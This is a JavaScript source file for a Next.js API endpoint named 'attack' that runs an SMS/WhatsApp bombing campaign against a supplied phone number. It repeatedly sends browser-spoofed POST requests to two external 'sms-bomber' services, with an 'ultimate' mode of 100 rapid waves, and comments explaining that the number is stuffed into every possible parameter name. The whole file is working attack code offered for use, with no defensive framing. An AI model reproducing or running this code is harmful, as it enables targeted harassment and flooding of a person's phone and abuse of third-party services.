// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const { number, amount, isUltimate } = req.body;

  const targetLinks = [
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 500 : 2000; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (link) => {
        try {
          // Amra ekhane pray sob possible parameter eksathe pathacchi
          // Jate oi website jekono ekta parameter diye kaj shuru kore
          const massivePayload = {
            number: number,
            phone: number,
            target: number,
            mobile: number,
            phone_number: number,
            amount: 1,
            count: 1,
            qty: 1,
            country: "BD",
            country_code: "880",
            service: "whatsapp",
            msg: "Ultimate Attack",
            auth: "true",
            token: "dummy_token",
            is_active: true,
            status: "active"
          };

          const response = await fetch(link, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'Origin': link,
              'Referer': link,
              'X-Requested-With': 'XMLHttpRequest',
            },
            body: JSON.stringify(massivePayload),
          });

          console.log(`[Wave ${i}] Target: ${link} | Status: ${response.status}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
  });
                        }
